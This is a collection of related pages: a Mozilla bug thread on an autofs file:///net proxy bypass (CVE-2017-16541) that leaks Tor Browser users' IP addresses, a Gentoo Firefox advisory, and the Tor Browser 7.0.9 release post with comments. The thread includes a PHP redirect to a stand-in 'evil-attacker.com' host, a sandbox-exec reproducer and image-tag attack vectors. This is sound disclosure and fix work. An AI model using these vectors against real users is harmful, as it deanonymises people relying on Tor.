My quick test on OSX 10.12.x shows that Chrome and Safari (latest versions) are not affected.
It is also interesting that I see the following message in the browser console after the page load completes (i.e., after it gives up on the automounted file):
Security Error: Content at <https://pearlcrescent.com/tor/am.html> may not load or link to file:///net/192.168.1.43/a.css.
Access is blocked (i.e., the CSS does not load, the image does not load), but only after an attempt has been made to open the file (or maybe just traverse its path.

Ouch, I was able to reproduce. There seems to me to be three things going on here:
a) Why are we loading pages that will generate security errors?
b) Is an HTTP page triggering opening a file content process? If so, I think that's a bug, as those will requests will always generate security errors. (I originally thought it was, but now that I see (c) it's possible this is all happening in the sandboxed process)
c) A kernel bug on macOS that sandboxed processes are able to trigger automount, minimal reproducer:
sandbox-exec -p '(version 1) (deny default) (allow process-exec\* (path "/usr/bin/stat")) (allow file-read\* (subpath "/usr") (subpath "/System") (subpath "/private/var/db/dyld"))' /usr/bin/stat /net/12.12.12.12/a.css
I can see that triggering things in the TCP dump.

For the stylesheet case at least, it seems like the security check is done after the stylesheet loader channel is created. That is probably okay for http: URLs (since creating the channel does not cause any network activity to occur in that case). But tracing through the code path underneath Loader::LoadSheet(), network activity occurs in the file:///net/... case inside the nsFileChannel constructor. Specifically, the call to IsSymlink() hits the network, which is not too surprising since it must call stat() or lstat().
I am not familiar with all of this code, but somehow the security check needs to be done earlier.

The "can web pages load file urls?" is done as part of the usual security checks (CheckMayLoad, CheckLoadURI, content policies like mixed-content blocker and CSP), and given the eventual error message these are still happening. We've found a number of things recently that send extra loads that bypass those. In particular I wonder if this is some kind of preload/prefetch/preconnect speculative load from the parser that bypasses content checks on the incorrect theory "it's OK as long as we check before they end up in the document".
There are multiple prefs that turn off various preloads. Might not take too much time to diagnose whether those are involved or not.
Some of those are
network.http.speculative-parallel-limit (set to 0, though it should only be for http)
network.dns.disablePrefetch (again, file: isn't expected to need dns)
and others that appear to be turned off already, but maybe I missed one that's relevant for file: loads.URL: <https://pearlcrescent.com/tor/am.html>Group: core-security → network-core-securityHas STR: --- → yesKeywords: [csectype-disclosure](/buglist.cgi?keywords=csectype-disclosure&resolution=---),

Adding a check to CheckMayLoad, CheckLoadURI, and/or possibly CheckLoadURIWithPrincial prior to constructing the nsIChannel by calling NS\_NewChannelWithTriggeringPrincipal in Loader::LoadSheet would likely solve this issue for attempting to load file: URIs as stylesheets, but would not solve it universally, if it exists elsewhere.
Another option is to bypass the stat checking when file uris are autofs uris on MacOS and Linux, so file:///net/\*. This would fix the problem for all instances with a file uri at a possible risk of symlink confusion breaking SOP (see [bug 782581](/show_bug.cgi?id=782581 "RESOLVED FIXED - Subverting Same-Origin Policy for Local Contents by Symbolic Link")). Since that case dealt with other Android processes gaining access to sensitive content such as password and cookie databases, this may be safe to break in this one case.

I think that seems a bit brittle to me. Arthur reproduced the issue with <img> tags as well.

This sounds like the more promising approach to me right now.

Okay, I tried to verify whether Linux is actually affected by this and, surprisingly, I failed so far. Here is what I did on a Debian testing machine and an Ubuntu 14.04:
1) Installed the autofs package
2) Uncommented the /net -hosts line in /etc/auto.master
3) Restarted the machine
4) Captured traffic with tcpdump/wireshark going to a website with the PoC.
5) No non-Tor traffic showed up.
I did this both in Tor Browser and vanilla Firefox (pointed to a local Tor) with different settings.
Does anybody have different steps that show Linux is affected, too?

That is the case for all of our security checks in fact. We create a channel and once we call open2() or also asyncOpen2() on the channel we perform the required security checks, because nothing should have hit the network until this point. Apparently you found a case where that's different. So your evaluation of the situation is accurate.
Since we already have the loadInfo available on the nsFileChannel we could use that information to figure out who triggered the load. I would imagine that the web never needs access to a local file and that any kind of upload scenarios (one would have to verify) are triggered by the SystemPrincipal. I hope that is the case, which would make sense. If all that is true then we could have a very hacky way of blocking. A very raw strawman patch could look like this:

Obviously we could also do some kind of string matching to figure out the file:///net case, but I am not sure if there are other ways to bypass that string matching.Flags: needinfo?(ckerschb)

This looks promising. However, I am not exactly sure that we have all the necessary things ready at this point looking at ESR 52 code. It seems to me [bug 1319111](/show_bug.cgi?id=1319111 "RESOLVED FIXED - Expose result principal URL (\"final channel URL\") on LoadInfo, convert current consumers of LOAD_REPLACE") added all the changes you build upon. And backporting that one + all the dependent bugs seems unrealistic. Am I missing something (and if not what options do we have instead)?

I did the same steps and I saw UDP traffic to the IP from the file:// path, on port 28416 (but not on port 111). However it only happens once, probably because the error is cached, so if I want to try it again I need to change the IP in the path.

I am adding Honza since he fixed [Bug 1319111](/show_bug.cgi?id=1319111 "RESOLVED FIXED - Expose result principal URL (\"final channel URL\") on LoadInfo, convert current consumers of LOAD_REPLACE").

In other words triggeringPrincipal information on the loadinfo for subrequest loads should definitely be accurate for ESR52. I don't fully understand why the final channel URL is important to fix the problem in this bug. As I understand it, if mFileURI [2] would point to e.g. file:///net then we would hit the network at the time we call ::init on nsFileChannel, right?

Thanks. You probably don't. I was just wondering how to get the proper loadInfo in the constructor and how to abort properly before we hit the UDP leak.

You can simply access the member mLoadInfo (which is the current loadinfo of the file channel). To abort the load I assume you can just return any NS\_ERROR\_\*. (Maybe NS\_ERROR\_FILE\_TARGET\_DOES\_NOT\_EXIST). I looked at other code within the ::init() function and it seems simply returning an error is all there is to do (once we exactly know what condition for aborting is).

Returning an error does not work as the compiler is complaining about doing so in a constructor. And just accessing `mLoadInfo` and doing things like you did in comment:10 (i.e. `mLoadInfo->TriggeringPrincipal()->GetIsCodebasePrincipal()`) does not work as `mLoadInfo` is `null` it seems (if I am doing a `if (mLoadInfo)` the code in the if-clause is never executed). So, what did you have in mind (sorry if I am not following)?Flags: needinfo?(ckerschb)

Well, this is what I had in mind actually. The loadInfo should not be null at this point. Can we figure out why it is null? As Mark suggested, first we could check that we get the required arguments within newChannel2(). But Maybe newChannel2 is not even called and the channel is created somehow different. Further down within the ::init() method, mLoadinfo is even accessed at the moment, so I am surprised it's null.
Regarding returning the error within the ::init() method, that should work, because there is already code that does the same. Or are you really trying to do it in the constructor and not the ::init() method?Flags: needinfo?(ckerschb)

::Init starts with NS\_ENSURE\_STATE(mLoadInfo);, which looks like it verifies that mLoadInfo is not nullptr.

I agree but we need ESR 52 code for Tor Browser and there is no such thing in nsFileChannel.cpp.[1] I tried to work with Christoph's code there which gave me the results I mentioned in comment:17 and made me wonder in comment:15.

[Bug 1319111](/show_bug.cgi?id=1319111 "RESOLVED FIXED - Expose result principal URL (\"final channel URL\") on LoadInfo, convert current consumers of LOAD_REPLACE") rearranged things like this:
instead of...
channel = new nsFileChannen(url) {
// the code we want to patch
}
channel->SetLoadInfo()
...it does...
channel = new nsFileChannel(url) : mURL(url) {}
channel->SetLoadInfo(loadinfo)
channel->Init() {
// the code we want to patch
}
you don't need to bother with the new resultPrincipalURI (not on esr52).
Regarding the codebase principal check, you should ask Boris, but I think we only use codebase principal for thing we are about to load from unknown (and potentially unsafe) uris, but we may also use codebase principal for moz-extenstion (privileged, I think).
as I understand, we later block the load in CSP. what exactly is the check doing? could we move whole check or the part of it that detects the load blocking here? to be on the safe side...

Partly, yes. The problems is that we hit the newChannel() call in `nsIOService::NewChannelFromURIWithProxyFlagsInternal()` without loadFlags. I guess what we can do is do just return an error in our case if we hit that part. I've implemented that in a patch and I don't see the proxy bypass on my Linux box anymore. mcs/arthur: could you verify that on OS X as well (see the attached patch; I could not give its final version a test yet as I blew my build away accidentally and need to make a full new one but am about to be afk)?

I built Tor Browser alpha (based on ESR52) without and with the patch (23447a7a1b0), for OS X, and tested it as before. I can confirm that the patch stops the proxy bypass for both the CSS and <image> cases. I have also browsed to several sites with the patched version and didn't run into any problems.
Here are my branches:

Here are my builds in case anyone wants to try it:

And I applied the patch to the latest Firefox ESR52 and pushed to try. We'll see how it goes:

Okay, we were about to release Tor Browser 7.0.9 with the attached workaround today but Filippo and Nicolas found ways to bypass it. So we stopped.
I don't have a URL handy to test for those new attack vectors but they seem to involve redirect mechanisms. Just pointing a victim to a php file containing:
<?php
header("Location: file:///net/evil-attacker.com/a.css");
?>
is supposed to be enough or creating an .htaccess file with the line

The problem seems to be that the codebase principal check is failing in the redirect case. Christoph: Do we have a different check we could use for both redirect/non-redirect cases? Just using the triggering principal one and preventing channel creation in that case already seems to be the nuclear option as it makes file:// unusable.Flags: needinfo?(ckerschb)

Dan, under what circumstances do we want to allow an http redirect to a file? I can't think of any off the top of my head (and didn't think we ever allowed it.. but apparently that's not true.). We can certainly block it right in the http channel code if there isn't some use case to support..

A simple test showed that we as expected block http->file redirects. For a quick fix we could add the simple schema check as suggested in [comment 36](/show_bug.cgi?id=1412081#c36 "RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux") to prevent creation of the file channel.
I can't think of a general check from the top of my head to do checkmayload checks prior we do stat() on the file.

At first I had trouble reproducing the HTTP redirect problem. For some reason the problem does occur reliably in the first/default tab in Tor Browser 7.0.x but I can always reproduce it in a new tab. Now I can confirm that the patch from [comment #36](/show_bug.cgi?id=1412081#c36 "RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux") closes the HTTP redirect hole on macOS.
I wonder if there are other similar holes that need to be closed. Script-based techniques such as setting document.location seem to be caught early by existing code that calls ssm->CheckLoadURIFromScript(). I tried using a file:///net/... URL as the src for an <iframe> but that is also blocked early by existing code. I don't think FTP supports redirect to an arbitrary URL. Can anyone think of other protocols or techniques within HTTP or HTML that we should examine? I don't know what netwerk/protocol/gio does but at least that is not included in ESR52 (so it is not an immediate concern for Tor Browser).

A couple of much weaker attacks I noticed:
1. The user could be induced to past file:///net/11.11.11.14/a.css into the URL bar
2. Open an html page with <img src="file:///net/11.11.11.14/a.jpg">. Now choose Page Info, click on the item for the fake image, click "Save As" and choose a location to save the file.
#1 is perhaps a concern. For #1 the most promising fix I can think of is to blacklist URLs of the form "file:///net/\*".
#2 seems unlikely to be a very useful attack vector, but perhaps it would be good to fix as well.

Thanks for those points. Yes, those are scenarios the final patch has to address, I agree. Especially #1. I think, though, we could release an update without addressing them (I am building right now a new Tor Browser including your redirect patch as well \*fingers crossed\*).

> I would imagine that the web never needs access to a local file
You would imagine wrong. See <http://searchfox.org/mozilla-central/rev/aa1343961fca52e8c7dab16788530da31aab7c8d/caps/nsIScriptSecurityManager.idl#129-134> for example.
> Dan, under what circumstances do we want to allow an http redirect to a file?
Again, see our explicit support for allowing some sites, controlled by prefs, to link to file:// URIs.
For the real underlying issue here, the basic problem is that file:// is so messed up, between symlinks, virtual filesystems, etc. Some specific issues with them:
1) Some of our security checks (e.g. CheckMayLoad) \_require\_ that symlinks be resolved
before a check is done, due to the fact that we treat files in the same dir as same-origin
but symlinks can cross directory boundaries. This obviously requires a stat().
2) CheckMayLoad also needs to stat() files because it needs to treat file:///foo and file:///FOO
as same-origin on case-insensitive filesystems.
3) For this bug, it sounds like CheckLoadURI needs to happen \_before\_ we ever stat() the file.
This list is clearly not exhaustive.
To fix issues around symlinks, we resolve symlinks (and hence stat() the file) immediately in nsFileChannel::Init. I urge everyone to read through [bug 670514](/show_bug.cgi?id=670514 "VERIFIED FIXED - Arbitrary File + Directory read via .lnk files on Windows Share") to see why doing it fully lazily (and not caching the stat() results) does not work. That said, we could consider doing it as part of the AsyncOpen security-check process, instead of Init(), and make sure that it happens after the CheckLoadURI call. I \_think\_ that should avoid regressing the issues from [bug 670514](/show_bug.cgi?id=670514 "VERIFIED FIXED - Arbitrary File + Directory read via .lnk files on Windows Share") while allowing us to fix this bug.
I should note that until we moved CheckLoadURI into the channel code, this was slightly less of an issue, because we did not create the channel until \_after\_ CheckLoadURI passed. I don't know whether CheckLoadURI still involved a stat() at that point or not. We would need to check whether it does one.
We definitely need to ensure that we do not ever \_read\_ the file (including for "symlink resolution" or Windows equivalent) until after CheckLoadURI passes in the cases in which reading the file is already a failure (various /dev/tty bits on Linux, Windows special files that hang or crash the process when read, etc).
> 1. The user could be induced to past file:///net/11.11.11.14/a.css into the URL bar
True. The user could also be induced to paste "touch /net/11.11.11.14/a.css" into their terminal... I think fundamentally having autofs enabled is pretty prejudicial to fully controlling your network access. :(
> Now choose Page Info, click on the item for the fake image, click "Save As" and choose a location to save the file.
Right, there's a fundamental tension here between "the page is not allowed to link there" and "the user wants to get the data"... It's worth looking at the history of whether page info ever enforced CheckLoadURI checks on the "Save As" functionality in its media tab and thinking about whether it should.

Something interesting I observed is, without the patch in [comment 36](/show_bug.cgi?id=1412081#c36 "RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"), some UDP events are detected at the target server, but that is followed by a Security Error appearing in the web console claiming the redirect is not permitted. So it appears that the intention was already to cancel (most) redirects from http to file:///, but the cancellation happens too late to prevent some network leakage. So, in the final patch, the existing code that prevents redirects to file:/// and takes into account certain prefs as mentioned by Boris, perhaps needs to be refactored to a new location such that cancellation happens earlier.

I think Boris added a bunch of very valuable information within [comment 44](/show_bug.cgi?id=1412081#c44 "RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"). Probably it's best we don't do stat() within ::init() but instead rather move it to asyncOpen2. Or more precisely to the contentSecurityManager right after we preform the CheckLoadURI check.Flags: needinfo?(ckerschb)

From conversation, the Linux sandbox "catches" and blocks that stat() from content, but resolving what is actually being stat() to see if it's allowed leads to the information leak happening on the chrome side. Content will be told the path is not allowed but of course by then the damage is done.
It's reasonable suspect the macOS kernel bug works along similar lines.

We can substitute internally to file:// (moz-ext:, resource:, jar:?), so general disabling is not possible, right.
We want to disable only: top level loads (typing in address bar, command line, link clicks), iframes, subresources, general redirects-to, something else?
The distinction could be system principal, but I'm not sure if there can be a case of a system-principal load that is user/content-controlled and not application-controlled.

If you could work on this, please do. The patches are here:
<https://gitweb.torproject.org/tor-browser.git/commit/?h=tor-browser-52.6.0esr-8.0-2&id=4fbe4216456298af5c68198b3ff0f552f9bb8464>

Now, those were just hacks (and a follow-up bugfix) we deployed to close the critical hole as fast as possible and they are breaking some file:// usage scenarios. I am not sure Mozilla would want those. If so, fine with us.

Only for our use case. It's still a proxy bypass, so Tor is carrying an incomplete fix for this that (I think) breaks some functionality like Save t file or something similar. They're going to wind up backporting whatever we come up with to 60; so it would be good to avoid a confusing rebase for them...

you don't need Record()
you have to read (check) the ',' character
the loop should be `while (!p.CheckEOF()) { do stuff; }
you may want to do path.Trim() as you don't skip whitespaces

OK, this can't be here. This was my main concern with the previous patch. This can potentially break things. It definitely changes behavior, is not behind the pref and definitely cannot be uplifted like this to ESR.
Move these lines INSIDE FilePreferences::IsAllowedPath and do it ONLY when there are names (prefixes) to be blacklisted or do the normalization as I do in my base patch (you will need the normalizer be a template and derive from TTokenizer<chat\_path\_t>, like #ifdef XPWIN typedef char16\_t char\_path\_t; #else typedef char char\_path\_t; #endif)
But I think this "has special dir -> throw" approach if fine when off by default.
OTOH, note that paths get here likely already normalized, at least on windows I could see that navigating to file:///c:/./././././././././././ is file://c:/ when coming to InitWithPath, no idea where that happens, but I made sure no smb request/lookup was triggered before InitWithPath was entered for file://///share uris.
hmm... we should make sure there is no code in upper layers that may look for /. or /.. in the path and call some system API normalization function that could trigger the smb/net lookup.

I kept it nsCString to be able to still do path.Trim(" ")
Since this only happens once, at startup, the extra number of copies should be minimal.

Yes, but that depends on the blacklisted path. If the parent name is /folder and we blacklisted /folder/ it will not match, but all of its children will.

Fair enough. Note that I kept some of the changes in AppendRelativeNativePath:
Append('.') does nothing.
Append('..') throws NS\_ERROR\_FILE\_UNRECOGNIZED\_PATH just like the windows implementation, and as specified in nsIFile.idl
I think the fact that it was accepted was a bug.

I made the Normalizer a template instead.
We now build the fileBlacklist code on windows too, even though it does nothing.

I think this is done in nsLocalFile::Normalize().
However, on Linux it performs a call to the system realpath, which resolves relative paths and also links.

I'll keep this one around (to fix nsIFile.idl inconsistency) unless it breaks some tests.

Georg, let me know if the attached patch is OK.
Note that it depends on Honza's patch from [bug 1413868](/show_bug.cgi?id=1413868 "RESOLVED FIXED - proxy bypass on windows via smb").
A few notes about the patch:
In order to block file access to "/net" you should add a pref (name:"network.file.path\_blacklist", value:"/net")
It does have one weakness: symlinks. For a given symlink A that is not blacklisted it is impossible to know if its target B is blacklisted or not.Flags: needinfo?(gk)

Turns out it broke some tests. :)
test\_bug1056939.js tested files that contained .. in them.
test\_file\_equality.js checks that appending . gives you a different file.
I filed [bug 1469737](/show_bug.cgi?id=1469737 "NEW") for this.
I also fixed the nsTArray\_base leak at shutdown.

Do you have one rebased against ESR60 handy by chance? I get a bunch of conflicts in FilePreferences.cpp when trying to apply your patch. I'll try to resolve them but I am a bit nervous about the correctness of the result.

What does that mean in practise? If an attacker is pointing to symlink A the proxy bypass we try to avoid is getting triggered?Flags: needinfo?(gk) → needinfo?(valentin.gosu)

This is too late for ESR52 at this point (we've already built the 52.9.0 RC and that's the last scheduled release for that branch). We still want this for Fx62 & ESR 60.2, though.

It means that if the attacker can create a symlink that points to B, or if the attacker is aware of A that points to B, they could potentially bypass the filter. That seems unlikely to me, but it's important to keep in mind.

That one works for us, thanks so much! (The one you pointed me to in comment:83 still shows the problem. It took me a while to figure out what was going on :) )
I am not sure about the symlink issue yet. While I am not worried about the attacker being able to create a symlink I feel it should not be possible for arbitrary (third-party) web content to trigger any proxy bypass in case the user has told the browser "hey, for any web-related traffic, please use proxy $foo", irrespective of how the machine of the user outside of the browser is configured. This does not block our alpha release, but we should think about it while we progress towards getting Tor Browser 8 into stable shape.

Nathan, can you take a look at [attachment 8986337](/attachment.cgi?id=8986337 "patch") [[details]](/attachment.cgi?id=8986337&action=edit "patch") [[diff]](/attachment.cgi?id=8986337&action=diff "patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1412081&attachment=8986337) ?
I'm leaking an nsTArray\_base, sBlacklist, and I'm not exactly sure I'm using StaticAutoPtr correctly.
I've confirmed it's not sWhitelist by commenting it out: <https://treeherder.mozilla.org/#/jobs?repo=try&revision=064c72d8511a3fa831cef3282fb75930ad6acf93&selectedJob=184200087>
Any idea why this leak is happening? Thanks!

Talking to Valentin over IRC turned up two potential scenarios for sBlacklist to leak:
a) InitPrefs possibly getting called after sBlacklist has been released:
<https://hg.mozilla.org/try/rev/7fb190786695#l1.49>
So we're re-initializing prefs after shutdown...which seems quite unlikely.
b) Some sort of race in IsAllowedPath:
<https://hg.mozilla.org/try/rev/145bf576adf9#l1.358>
T1: In IsAllowedPath, check for the presence of sBlacklist
T1: sBlacklist is there, proceed
T2: clear sBlacklist as we're going through shutdown
T1: Call PathBlacklist, which re-allocates sBlacklist and leaks
This race is plausible in [attachment 8986337](/attachment.cgi?id=8986337 "patch") [[details]](/attachment.cgi?id=8986337&action=edit "patch") [[diff]](/attachment.cgi?id=8986337&action=diff "patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1412081&attachment=8986337) (though we really should have some checking in the ClearOnShutdown machinery to catch this sort of thing), but the try push actually changes things in IsAllowedPath:
<https://hg.mozilla.org/try/file/5c706ce50459/xpcom/io/FilePreferences.cpp#l267>
so that we don't try reallocating...but in that case, we should hit some sort of null pointer dereference if the race was really happening.
I tried getting a handle on where the allocated nsTArray\_base was coming from, but the debugging infrastructure we had for that blew up in my face.
So now I'm not sure where the leak is coming from. =/

Add ability to blacklist file paths on Unix platforms
Approval Request Comment
[Feature/Bug causing the regression]:
TOR requirement to block access to certain paths on the filesystem
[User impact if declined]:
A website could potentially anonymize a user who has autofs installed by triggering the access of certain paths in /net/ on Unix-like machines.
[Is this code covered by automated tests?]:
The patch includes a gtest
[Has the fix been verified in Nightly?]:
Yes
[Needs manual test from QE? If yes, steps to reproduce]:
Reproduce [comment 0](/show_bug.cgi?id=1412081#c0 "RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux"). Set network.file.path\_blacklist to /net. Restart the browser. Check that the bug is fixed.
[List of other uplifts needed for the feature/fix]:
[attachment 8990057](/attachment.cgi?id=8990057 "Call KillClearOnShutdown(ShutdownPhase::ShutdownFinal) in PluginProcessChild on all platforms") [[details]](/attachment.cgi?id=8990057&action=edit "Call KillClearOnShutdown(ShutdownPhase::ShutdownFinal) in PluginProcessChild on all platforms") [[diff]](/attachment.cgi?id=8990057&action=diff "Call KillClearOnShutdown(ShutdownPhase::ShutdownFinal) in PluginProcessChild on all platforms") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1412081&attachment=8990057) to avoid leaks in the plugin process.
[Is the change risky?]:
Low risk
[Why is the change risky/not risky?]:
The patch only produces effects when the pref is set, which will probably only affect TOR.
[String changes made/needed]:
None.Flags: needinfo?(valentin.gosu)

[ESR60] patch
[Approval Request Comment]
If this is not a sec:{high,crit} bug, please state case for ESR consideration:
Required in TOR.
User impact if declined:
[TOR] A website could potentially anonymize a user who has autofs installed by triggering the access of certain paths in /net/ on Unix-like machines.

Hi Valentin, just a note, generally by "verified" we mean that the issue was reproducible and the fix was checked by someone who isn't the assignee or reviewer.

With the steps from [comment 0](/show_bug.cgi?id=1412081#c0 "RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux") mostly.
I used 2 different stations. One was on mac and the other on Ubuntu.
On mac I created the pref from [comment 103](/show_bug.cgi?id=1412081#c103 "RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux") (network.file.path\_blacklist set to /net). I changed the proxy and port and I opened the link from [comment 0](/show_bug.cgi?id=1412081#c0 "RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux") (<https://pearlcrescent.com/tor/am.html>).
On Ubuntu, I opened Firefox, changed the pref and port and then in the terminal I wrote the command "sudo tcpdump port 111".
Did I do everything wrong? Maybe I didn't understand fully what I have to do, because I got the same behaviour on the old builds as on the latest Nightly.Flags: needinfo?(oana.botisan)

I am not sure regarding macOS but on Linux you need to install the autofs package and uncomment the line "/net -hosts" in /etc/auto.master first as a preparation step. When testing our backport for this patch I configured Tor as a proxy (just installing Tor via your package manager should suffice and then entering 127.0.0.1:9050 as the SOCKS proxy host/port) and then looked at my local wireshark output. Hope this helps. Let me know if not.Flags: needinfo?(arthuredelstein)

Valentin, there seems to be some kind of discrepancy between our code base and the tore code base on ESR60 (IIUC).
Our code (the current, latest changeset):
<https://hg.mozilla.org/releases/mozilla-esr60/annotate/8a1e8be23bad/xpcom/io/FilePreferences.cpp#l263>
Tor code:

(file) <https://gitweb.torproject.org/user/richard/tor-browser.git/tree/xpcom/io/FilePreferences.cpp?h=bug_26874&id=50f4653b90316394e7d6d3cd4a3e92e12f377666#n263>
Please see [https://bugzilla.mozilla.org/show\_bug.cgi?id=1413868#c70](/show_bug.cgi?id=1413868#c70 "RESOLVED FIXED - proxy bypass on windows via smb") for further details. They claim that the patches don't work and removing the |if (!sWhitelist) { return false; }| part fixes it.
It may be that AllowUNCDirectory() which ensures sWhitelist is not called from some reason.
Maybe we should change the code to block all unc paths when sWhitelist is null and sBlockUNCPaths == true?
It's hard to track what's actually correct with all the backouts and merges.
Note: <https://dxr.mozilla.org/mozilla-esr60/> is out of sync ://Flags: needinfo?(valentin.gosu)

Ok I have access now!
Yeah so the issue here is that sWhitelist is only populated after a call to PathWhitelist(). The various directories are whitelisted during firefox init (and sWhitelist is populated) in AllowUNCDirectory(char const\*) by way of InitDirectoriesWhitelist(). However, the call to PathWhitelist() does not occur until the end of AllowUNCDirectory(), and only if the directory resolves to an SMB path (ie, begins with \\). So, unless one of the special dirs live on an SMB share, sWhitelist will never be populated, and the call to IsBlockedUNCPath() will always early out due to the !sWhiteList check.
The !sWhitelist check should be removed, since the underlying pointer is never accessed directly, and always through the PathWhitelist() getter/initializer.
I've a screenshot ( here: [https://bugzilla.mozilla.org/show\_bug.cgi?id=1413868](/show_bug.cgi?id=1413868 "RESOLVED FIXED - proxy bypass on windows via smb") ) demoing the proxy bypass still exists in ESR60 on Windows 7.

I think that's because TOR landed the patch in before [comment 89](/show_bug.cgi?id=1412081#c89 "RESOLVED FIXED - (CVE-2017-16541) Proxy bypass caused by autofs on Mac, Linux") ([attachment 8986596](/attachment.cgi?id=8986596 "[ESR60]  patch") [[details]](/attachment.cgi?id=8986596&action=edit "[ESR60]  patch") [[diff]](/attachment.cgi?id=8986596&action=diff "[ESR60]  patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1412081&attachment=8986596)) and the ESR patch landed a bit later, with a few nits.
The version in m-c actually does not contain the sWhitelist thing, since the leak didn't happen on Windows, so I assume we should probably update TOR and ESR.

I agree. I'll file a separate bug for it.Flags: needinfo?(valentin.gosu)

# Streamline handling of file:// resources on OS X and Linux

We should streamline handling of file:// resources in a way that it does not break things while making sure that the restrictions currently applied are enforced more thoroughly.

To upload designs, you'll need to enable LFS and have an admin enable hashed storage. [More information](/help/user/project/issues/design_management.md#prerequisites)

# Mozilla Firefox: Multiple vulnerabilities — GLSA **201810-01**

Multiple vulnerabilities have been found in Mozilla Firefox, the
worst of which may allow execution of arbitrary code.

### Affected packages

| Package | **www-client/firefox** on all architectures |
| --- | --- |
| Affected versions | < **60.2.2** |
| Unaffected versions | >= **60.2.2** |

| Package | **www-client/firefox-bin** on all architectures |
| --- | --- |
| Affected versions | < **60.2.2** |
| Unaffected versions | >= **60.2.2** |

### Background

Mozilla Firefox is a popular open-source web browser from the Mozilla
Project.

### Description

Multiple vulnerabilities have been discovered in Mozilla Firefox. Please
review the referenced CVE identifiers for details.

### Impact

A remote attacker could entice a user to view a specially crafted web
page, possibly resulting in the execution of arbitrary code with the
privileges of the process or a Denial of Service condition. Furthermore,
a remote attacker may be able to perform Man-in-the-Middle attacks,
obtain sensitive information, spoof the address bar, conduct clickjacking
attacks, bypass security restrictions and protection mechanisms, or have
other unspecified impact.

### Workaround

There is no known workaround at this time.

### Resolution

All Mozilla Firefox users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=www-client/firefox-60.2.2"

```

All Mozilla Firefox binary users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=www-client/firefox-bin-60.2.2"

```

| [Description](show_bug.cgi?id=1632062#c0)  Doran Moppert    2018-09-24 02:25:39 UTC  ``` A potentially exploitable crash in `TransportSecurityInfo` used for SSL can be triggered by data stored in the local cache in the user profile directory. This issue is only exploitable in combination with another vulnerability allowing an attacker to write data into the local cache or from locally installed malware.

# Tor Browser 7.0.9 is released

by gk | November 3, 2017

![](../static/images/lead.png)

**Note: Tor Browser 7.0.9 is a security bugfix release for macOS and Linux users only. Users on Windows are not affected and stay on Tor Browser 7.0.8.**

Tor Browser 7.0.9 is now available for our [macOS](https://www.torproject.org/download/download-easy.html#mac) and [Linux](https://www.torproject.org/download/download-easy.html#linux) users from the Tor Browser Project page and also from our [distribution directory](https://www.torproject.org/dist/torbrowser/7.0.9/).

This release features an important security update to Tor Browser for macOS and Linux users. Due to a [Firefox bug](https://bugzilla.mozilla.org/show_bug.cgi?id=1412081) in handling file:// URLs it is possible on both systems that users leak their IP address *(note: as of Nov. 4, 2017, this link is non-public while Mozilla works on a fix for Firefox)*. Once an affected user navigates to a specially crafted URL the operating system may directly connect to the remote host, bypassing Tor Browser. **Tails users and users of our sandboxed-tor-browser are unaffected, though**.

The bug got reported to us on Thursday, October 26, by Filippo Cavallarin. We created a workaround with the help of Mozilla engineers on the next day which, alas, fixed the leak only partially. We developed an additional fix on Tuesday, October 31, plugging all known holes. We are not aware of this vulnerability being exploited in the wild. Thanks to everyone who helped during this process!

We are currently preparing updated macOS and Linux bundles for our alpha series which will be tentatively available on Monday, November 6. Meanwhile macOS and Linux users on that series are strongly encouraged to use the stable bundles or one of the above mentioned tools that are not affected by the underlying problem.

**Update**: [Tor Browser 7.5a7](https://blog.torproject.org/tor-browser-75a7-released) has now been released.

**Known issues**: The fix we deployed is just a workaround stopping the leak. As a result of that navigating file:// URLs in the browser might not work as expected anymore. In particular entering file:// URLs in the URL bar and clicking on resulting links is broken. Opening those in a new tab or new window does not work either. A workaround for those issues is dragging the link into the URL bar or on a tab instead. We track this follow-up regression in [bug 24136](https://trac.torproject.org/projects/tor/ticket/24136).

Here is the full [changelog](https://gitweb.torproject.org/builders/tor-browser-bundle.git/plain/Bundle-Data/Docs/ChangeLog.txt?h=maint-7.0) since 7.0.8:

* OS X
  + [Bug 24052](https://trac.torproject.org/projects/tor/ticket/24052): Streamline handling of file:// resources

Why until Monday for the alpha release? Does the patch not work when merged for it or it's that you didn't have the time to test whether it works?

This is a bit a not-the-best-thing-you-could-pull-up type of thing, only if alpha users read this blog could they even know in the first place that they should use the stable build before the Monday release to not be affected by a proxy disobedience bug.

Alpha users are ideally developers wanting to test the software and report bugs, or at least users that are fine with experiencing bugs like this. They ideally aren't regular people actually needing Tor's protections in a significant way.

That said, I'm also curious why alpha needs to wait.

The main reason is that the process for building, signing and publishing a new release takes time, and since the stable channel is what most people are using we prepared the stable release in priority and released it as soon as we could without waiting for the alpha to be ready.

I bet that on modern CPUs such as AMD's Ryzen/ThreadRipper and Intel's i7/i9 lineup building speed can be really minimal. So is the reason why the build is so slow is that you're using old hardware that isn't affected by Intel's Management Engine or AMD's Platform Security Processor to avoid compromise of the build machine? In that case you're absolutely right and I'll support your decision 100%!

Whatever the reason is for the delay, that isn't it. They (perhaps correctly) don't bother about that stuff. Builds are supposed to be byte-identical between machines anyway.

Even on fast hardware the build process takes a few hours. After we have a build that we could match on different machines, the signature process is quite complex and involves transferring around 9GB of files between different places which also takes time. Then we need to transfer all those files to the mirrors which also take several hours. And finally we need to write a blog post, update the website and carefully check that everything is right before enabling the update. So with the weekend we were not sure we would be able to do all that before Monday, but it's done now.

I support removing file:// support as much as possible. It is a dangerous attack surface and most end users do not use it. Web browser is for http:// + https://. If you want to browse file:// use a different tool.

Special case like upload and download should restrict to browser's folder. An attempt to read or write outside the folder should be denied.

